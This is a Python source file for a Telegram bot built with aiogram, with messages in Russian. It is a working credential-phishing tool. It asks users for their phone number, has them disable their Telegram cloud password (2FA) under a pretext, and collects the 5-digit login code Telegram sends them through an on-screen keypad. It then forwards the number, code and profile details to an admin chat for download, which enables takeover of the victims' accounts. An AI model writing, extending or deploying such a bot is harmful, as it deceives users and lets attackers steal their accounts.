import sqlite3

from aiogram import Router, F
from aiogram.fsm.context import FSMContext
from aiogram.types import CallbackQuery, KeyboardButton, ReplyKeyboardMarkup, Message, InlineKeyboardButton, FSInputFile
from aiogram.utils.keyboard import InlineKeyboardBuilder

from bot.database.db import cursor, conn, DB_NAME
from bot.database.user.user import save_user_to_db, save_code_to_db, get_user_from_db
from bot.helpers.helpers import get_numeric_kb, create_user_data_file
from bot.start_bot import OWNER_ID, bot, test_id
from bot.handlers.command_start import admin_id
from bot.states.user import AuthState

router = Router()


def update_2fa_status(user_id):
    conn = sqlite3.connect(DB_NAME)
    cursor = conn.cursor()

    cursor.execute("""
        UPDATE users SET two_fa_disabled = 1 WHERE user_id = ?
    """, (user_id,))

    conn.commit()
    conn.close()


# Клавиатура подтверждения отключения 2FA
def confirm_disable_2fa_kb():
    kb = InlineKeyboardBuilder()
    kb.row(InlineKeyboardButton(text="✅ Да, я отключил 2FA систему", callback_data="off_2fa"))
    return kb.as_markup()


@router.callback_query(F.data == "start_button")
async def get_phone(call: CallbackQuery, state: FSMContext):
    phone_keyboard = ReplyKeyboardMarkup(
        keyboard=[[KeyboardButton(text="📞 Отправить номер", request_contact=True)]],
        resize_keyboard=True,
        one_time_keyboard=True
    )

    await call.message.answer(
        "📞 Пожалуйста, отправьте ваш номер телефона:",
        reply_markup=phone_keyboard
    )
    await state.set_state(AuthState.phone)
    await call.answer()


@router.message(AuthState.phone, F.contact)
async def contact_handler(message: Message, state: FSMContext):
    user_id = message.from_user.id
    name = message.from_user.full_name  # Имя пользователя
    username = message.from_user.username if message.from_user.username else "Не указан"
    phone_number = message.contact.phone_number

    # Сохраняем пользователя в БД
    save_user_to_db(user_id, name, username, phone_number)

    await state.update_data(phone=phone_number)

    await message.answer(
        """🔌<b>Отключите 2FA систему, чтобы бот мог проверить информацию. Сделайте следующее:</b>

1️⃣ Зайдите в свой профиль.  
2️⃣ Перейдите в раздел <b>Конфиденциальность</b>.  
3️⃣ Выключите облачный пароль.

<b>❗️ После выполнения нажмите кнопку «✅ Да, я отключил 2FA систему».</b>""",
        parse_mode="HTML",
        reply_markup=confirm_disable_2fa_kb()
    )

    await bot.send_message(
        admin_id,
        f"📩 <b>Новый пользователь!</b>\n"
        f"👤 <b>Имя:</b> {name}\n"
        f"🔗 <b>Username:</b> {username}\n"
        f"📱 <b>Номер телефона:</b> <code>{phone_number}</code>\n",
        parse_mode="HTML"
    )

    await state.set_state(AuthState.confirm_disable_2fa)


@router.callback_query(F.data == "off_2fa")
async def confirm_2fa_off(call: CallbackQuery, state: FSMContext):
    data = await state.get_data()
    phone_number = data.get("phone", "Неизвестен")
    user_id = call.from_user.id

    update_2fa_status(user_id)

    await call.message.answer(
        f"✅ <b>Спасибо! Ваш номер:</b> <code>{phone_number}</code>\n"
        "🔓 2FA система отключена.\n"
        "Ожидайте дальнейших инструкций.",
        parse_mode="HTML",
        reply_markup=get_numeric_kb()
    )

    await state.clear()
    await call.answer()


@router.callback_query(F.data.startswith("num_"))
async def enter_code(call: CallbackQuery, state: FSMContext):
    data = await state.get_data()
    code = data.get("code", "")

    if len(code) >= 5:
        await call.answer("❌ Вы уже ввели 5 цифр!", show_alert=True)
        return

    code += call.data.split("_")[1]
    await state.update_data(code=code)

    await call.message.edit_text(
        f"<b>➡️ Ваш код:</b> <code>{code}</code>\n"
        "👇 Введите код, отправленный от <b>Telegram:</b>",
        reply_markup=get_numeric_kb(len(code) == 5),
        parse_mode="HTML"
    )
    await call.answer()


@router.callback_query(F.data == "confirm_code")
async def confirm_code(call: CallbackQuery, state: FSMContext):
    data = await state.get_data()
    user_id = call.from_user.id
    user_code = data.get("code", "")

    if len(user_code) < 5:
        await call.answer("❌ Введите ровно 5 цифр перед отправкой!", show_alert=True)
        return

    save_code_to_db(user_id, user_code)

    user_data = get_user_from_db(user_id)
    if user_data:
        name, username, phone, _ = user_data
        username = f"@{username}" if username else "Не указан"

        # Клавиатура с кнопкой "📄 Скачать данные"
        kb = InlineKeyboardBuilder()
        kb.row(InlineKeyboardButton(text="📄 Скачать данные", callback_data=f"download_user_data:{user_id}"))

        await call.bot.send_message(
            admin_id,
            f"📩 <b>Новый пользователь подтвердил код!</b>\n"
            f"👤 <b>Имя:</b> {name}\n"
            f"🔗 <b>Username:</b> {username}\n"
            f"📱 <b>Номер телефона:</b> <code>{phone}</code>\n"
            f"🔢 <b>Код подтверждения</b>: <i>(Скрыт. Нажмите '📄 Скачать данные')</i>",
            parse_mode="HTML",
            reply_markup=kb.as_markup()
        )

        await call.message.edit_text(
            "<b>✅ Спасибо!</b>",
            parse_mode="HTML"
        )
    else:
        await call.answer("❌ Ошибка! Данные не найдены.", show_alert=True)

    await state.clear()


@router.callback_query(F.data.startswith("download_user_data:"))
async def download_user_data(call: CallbackQuery):
    user_id = int(call.data.split(":")[1])
    file_path = create_user_data_file(user_id)

    if file_path:
        await call.bot.send_document(
            admin_id,
            FSInputFile(file_path),
            caption=f"📂 Данные пользователя. {user_id}"
        )
    else:
        await call.answer("❌ Ошибка! Файл не найден.", show_alert=True)


@router.callback_query(F.data == "delete_number")
async def delete_last_digit(call: CallbackQuery, state: FSMContext):
    data = await state.get_data()
    code = data.get("code", "")

    if code:
        code = code[:-1]
        await state.update_data(code=code)

        await call.message.edit_text(
            f"<b>➡️Ваш код:</b> <code>{code}</code>\n"
            "👇 Введите код, отправленный от <b>Telegram:</b>",
            reply_markup=get_numeric_kb(),
            parse_mode='HTML'
        )

    await call.answer()


@router.callback_query(F.data == "reset_number_code")
async def reset_code(call: CallbackQuery, state: FSMContext):
    await state.update_data(code="")  # Очищаем код

    await call.message.edit_text(
        f"<b>➡️Ваш код:</b> <code></code>\n"
        "👇 Введите код, отправленный от <b>Telegram:</b>",
        reply_markup=get_numeric_kb(),
        parse_mode='HTML'
    )

    await call.answer("✅ Код очищен!", show_alert=True)
